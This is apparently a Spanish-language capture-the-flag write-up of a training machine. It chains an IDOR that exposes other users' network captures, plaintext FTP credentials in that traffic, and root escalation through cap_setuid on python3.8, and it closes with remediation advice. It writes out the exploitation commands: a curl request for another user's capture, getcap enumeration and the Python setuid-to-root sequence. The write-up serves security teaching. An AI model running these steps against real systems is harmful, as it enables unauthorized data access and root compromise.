1. Resumen Ejecutivo

Esta máquina demuestra dos vulnerabilidades críticas de seguridad encadenadas:

  1. IDOR (Insecure Direct Object Reference): la aplicación web permite acceder a capturas de red de otros usuarios sin validar permisos, simplemente cambiando un ID en la URL.
  2. Configuración insegura de Linux Capabilities: el binario de Python tiene asignada la capability cap_setuid, lo que permite a cualquier usuario cambiar su UID a 0 (root).

Resultado final: acceso inicial como usuario nathan → escalada a root.

Dato sensible comprometido: credenciales FTP en texto plano, capturadas dentro del propio tráfico expuesto por la app.

La app ejecuta comandos del sistema y expone su resultado, lo que sugiere permisos elevados y una superficie de ataque interesante. Al abrir "Security Snapshot" se redirige a:

El 1 final es un ID secuencial de captura — la primera pista de un posible IDOR.

5. Explotación IDOR

IDOR (Insecure Direct Object Reference) ocurre cuando una aplicación expone una referencia directa a un recurso (como un ID en la URL) sin verificar que el usuario tenga permiso para acceder a él.

Mi captura, autenticada como nathan, vive en /data/1. Si el servidor no valida propiedad del recurso, otras capturas deberían ser accesibles igual:

curl http://<IP>/data/0

✅ Acceso permitido sin autenticación adicional. La captura 0, perteneciente a otro usuario, se descarga sin ninguna comprobación de permisos: 72 paquetes totales, 69 TCP.

Impacto: cualquier visitante puede iterar sobre /data/0, /data/2, etc. y leer capturas de tráfico de otros usuarios — potencialmente con credenciales dentro.

8. Escalada de Privilegios

Las Linux Capabilities dividen los privilegios de root en unidades más pequeñas que se pueden asignar a binarios concretos. cap_setuid permite a un proceso cambiar su propio UID — normalmente un privilegio exclusivo de root. 

getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

🔴 Crítico: cualquier usuario puede invocar python3.8 y, dentro del intérprete, elevar su propio UID a 0.

python3.8
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")

# id
uid=0(root) gid=0(root) groups=0(root)

root.txt

Por política de responsible disclosure de HTB, la flag de root no se publica — el "Pwned" queda verificado en mi perfil y en el certificado de la máquina.

✔ root.txt submitted

9. Conclusiones y Remediación

1. IDOR — Severidad alta

Remediación: validar en el servidor que el recurso solicitado pertenece al usuario autenticado antes de servirlo, en vez de confiar en el ID recibido del cliente.

2. Credenciales en texto plano (FTP) — Severidad crítica

Remediación: sustituir FTP por SFTP/FTPS, cifrando cualquier transferencia que incluya credenciales.

3. cap_setuid en el intérprete de Python — Severidad crítica

Remediación: nunca asignar cap_setuid a un intérprete de propósito general; usar capabilities mínimas y auditarlas periódicamente con getcap -r /.

La cadena de ataque completa combinó una vulnerabilidad de lógica de negocio (IDOR) con una configuración insegura a nivel de sistema (capabilities), demostrando que las fallas más simples suelen ser las más explotables.
